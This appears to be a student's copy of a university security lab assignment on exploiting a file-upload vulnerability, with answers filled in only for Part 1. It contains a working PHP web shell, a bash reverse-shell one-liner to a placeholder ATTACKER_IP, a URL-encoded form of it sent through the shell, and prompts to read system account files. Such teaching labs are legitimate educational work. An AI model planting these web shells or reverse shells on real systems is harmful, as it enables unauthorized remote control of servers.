@@ -1,0 +1,246 @@
+Leo Moran
+10/29/2024
+
+##### Part 1: Installing a PHP web shell
+
+Sometimes, a vulnerability in a website will enable you to install code on the web server and then execute that code. There are many such vulnerabilities, but the one we're going to look at here is called a file upload vulnerability. When we exploit it, we'll upload a file that enables us to execute arbitrary commands on the server.
+
+    * Use a browser to explore http://danger.jeffondich.com/. Feel free to upload 
+    files of your own, with two caveats:
+
+        * The name of every file you upload should start with your Carleton username. 
+        Like jondich-moose.jpg or loesper-schiller.png.
+
+        * Keep your uploaded images community-friendly.
+
+    * Upload a web shell written in PHP, and make sure to name it using your username, 
+    like jondich-webshell7.php (if it's my 7th attempt to get it right). Here's a 
+    simple one you can use.
+    <pre>
+
+    <?php
+        if (isset($_REQUEST["command"])) {
+            system($_REQUEST["command"]);
+        } else {
+            echo "No command requested.";
+        }
+    ?>
+    </pre>
+
+---- Answer these questions:
+    a. Explain how you can execute the Linux command whoami on the server using your 
+    webshell. What result do you get when you execute that command?
+
+    b. What is this webshell's <pre> tag for? (And more to the point, what happens if 
+    you leave it out?)
+
+##### Part 2: Looking around
+
+Now that you have a webshell working, what can you do with it? Let's find out. 
+Warning: do not mess with your classmates' files!
+Answer these questions:
+
+    a. What directory is danger's website located in?
+
+    b. What are the names of all the user accounts on danger.jeffondich.com? How do 
+    you know?
+
+    c. Do you have access to the file /etc/passwd? What's in it?
+
+    d. Do you have access to the file /etc/shadow? What's in it? (You'll have to look 
+    onliine for the answer to that second question, since the answer to the first is 
+    no.)
+
+    e. There may be some secret files scattered around. See how many you can find and 
+    report on your discoveries.
+
+    f. [Optional] Report on anything else interesting you discover.
+
+##### Part 3: Setup for Part 4
+
+When you SSH to a server like mantis.mathcs.carleton.edu, you are creating a forward 
+shell (also known as a bind shell or just a shell) on the server. That is, from your 
+client system, you are asking the server to launch an instance of bash (or zsh, etc.), 
+and connect that shell's stdin and stdout to your TCP/SSH connection. Once this 
+connection is set up, you can type commands on the server as though you were sitting 
+in front of the physical server and typing at its keyboard.
+
+Another way of connecting an instance of bash on the server to your computer is known 
+as a reverse shell. This is where you launch bash on the target computer and force it 
+to connect back to your attacking computer. There are lots of reasons for using reverse 
+shells, and we'll discuss some of them in class.
+
+Our general approach to setting up a reverse shell from a Linux target machine will go 
+like this:
+
+    * On the attacking machine, we launch a listener with a command like 
+    nc -l -p ATTACKER_PORT
+
+    * On the target machine, we execute this very weird command:
+    bash -c "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"
+
+    * Now, on the attacking machine, you will have a bash prompt from which you can 
+    execute commands on the target machine.
+
+    * Cool!
+
+Unfortunately, we can't set up a reverse shell from danger.jeffondich.com to your 
+laptop. That's because your laptop has a local network IP address on the Carleton 
+network (or on your wifi in an off-campus house or coffee shop), not a globally visible 
+IP address. As a result, danger.jeffondich.com can't initiate a connection to your 
+laptop--the connection initiation has to go from your laptop to danger.jeffondich.com. 
+(See my discussion of local networks from the other day.)
+
+But you have an account on mirage.mathcs.carleton.edu, right? And it has a global IP 
+address that's visible from outside Carleton, right? Right. However, machines like 
+mirage are set up with firewalls that reject all inbound connection requests except for 
+SSH (port 22) and sometimes HTTPS/HTTP (ports 443/80). So again, danger.jeffondich.com 
+won't be able to initiate a connection to your nc listener if the listener is on 
+mirage.
+
+So, you're gonna use your installation of Kali to help you practice setting up a 
+reverse shell. For this exercise, Kali will be the target machine, and your host OS 
+will be the attacking machine.
+
+---- Setting up Kali as the target
+
+Kali needs a webserver with a webshell that you can attack from your host OS. This 
+turns out to be easy, given the preinstalled and preconfigured tools on Kali.
+
+    * Launch the Apache2 web server on Kali.
+
+    * sudo systemctl start apache2
+
+    * Copy your webshell.php to /var/www/html/webshell.php on Kali. (The default 
+    location for an Apache2 web directory on Linux is /var/www/html.)
+
+    * Pause for a moment and think about what you just did: you intentionally installed 
+    a massive vulnerability (a webshell) on your Kali webserver so you can exploit it 
+    to learn how to set up a reverse shell. If you were doing a real-life pen-test (or 
+    worse, if you were an evil hacker), you would have to figure out some way to cause 
+    that webshell to get installed on the target system before you could use it. This 
+    kind of thing--intentionally setting up a vulnerable target--is essential for 
+    learning about hacking techniques.
+
+    * Test your webshell/Apache2 setup by going to your host OS, opening a terminal, 
+    and running curl 'http://KALI_IP/webshell.php?command=whoami'
+
+---- Setting up your host OS as the attacker
+
+All you need is nc. If you have a macOS computer, you already have nc installed, so 
+you're ready to go.
+
+If you're on Windows with WSL installed, you probably already have nc available in WSL. 
+Open one of those terminals, and you're good.
+
+If you're on Windows without WSL, you'll need a copy of nc.exe. (It would be helpful to 
+tons of Windows sysadmins if Microsoft would put more of the most common network 
+management tools on Windows by default, but here we are. But I digress.) Weirdly, we're 
+going to get you a safe copy of nc.exe by starting on Kali.
+
+    * On Kali, install the package named windows-binaries, like so:
+
+    * sudo apt install windows-binaries
+
+    * This will create a folder /usr/share/windows-resources/binaries containing a 
+    bunch of stuff, including nc.exe
+
+    * Transfer a copy of nc.exe to your host OS. There are lots of ways to do this. I'm 
+    going to leave this as an exercise for the reader.
+
+    * Let's pretend you stick nc.exe on your Windows Desktop. Then you can open a cmd 
+    or powershell terminal, cd to your Desktop, and then run a quick test:
+
+    .\nc.exe time-a-g.nist.gov 13 
+
+    (which should give you the current date and time, like in your Wireshark assignment 
+    back at the beginning of the term).
+
+##### Part 4: launching a reverse shell
+Answer these questions and do these things:
+
+    a. What is the IP address of your Kali VM (the target machine)? How did you find out?
+    
+    b. What are the IP addresses of your host OS (the attacking machine)? How did you 
+    find out? Which one should you use to communicate with Kali and why?
+    
+    c. On your host OS (the attacker), pick any port number between 5000 and 10000 and 
+    run nc -l -p YOUR_CHOSEN_PORT
+    
+    d. In a browser on your host machine, use your web shell to go to this crazy URL.
+    http://KALI_IP/YOUR_WEBSHELL.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT%200%3E%261%22
+                Note that "YOUR_WEBSHELL" should of course be replaced by the name of 
+                your web shell you installed in the Apache2 home  directory on Kali 
+                during Part 3.
+                
+    e. Go back and look at your nc -l -p terminal on your host OS (attacking machine). 
+    Do you have a shell now? Is it letting you execute commands on Kali? How do you 
+    know it's Kali?
+    
+    f. What are all those % codes in the URL you used?
+    
+    g. Write a brief description, probably including a diagram, explaining how this 
+    reverse shell is functioning.
+
+
+Answers: 
+
+Part 1
+a. Using my laptop's bash terminal, I made use of the command:
+
+curl -v 'http://<website IP Address>/uploadedimages/moranl2-webshell.php$command=whoami'
+
+The -v made the command give out more details as it stands for verbose, when I tried 
+to run the command using only the website name, I got a 301 Moved Permanetly error, 
+so the command wouldn't work without the ip address. I got the ip throught the use of:
+
+host <website name> 
+
+I needed to enter into the exact directory for where my file was stored, which is why I 
+had to enter into the uploadedimages folder, which is the same folder that I was told 
+that my file is saved in on the website itself after uploading a file. 
+
+Then, to run the linux command, I needed to add the question mark the start of a query 
+string, which allowed me to set the value of command to the wanted command of whoami. 
+Through the use of the linux command, I was then able to retrieve
+<pre>
+www-data
+</data>
+
+(Disclaimer, my professor provided me with the command itself, but I am the one who 
+made the explinations behind the command.)
+
+b. As mentioned during class on 10/30/2024, the pre tag tells the browser to treat the 
+results as pre-formatted where it makes use of characters such as the newline character, 
+rather than have all the text in one continuous line.
+
+
+Part 2
+a. 
+
+b. 
+
+c. 
+
+d. 
+
+e. 
+
+[Stop here]
+f. 
+
+
+Part 4
+a. 
+
+b. 
+
+c. 
+
+d. 
+
+e. 
+
+f. 
+
+g. 
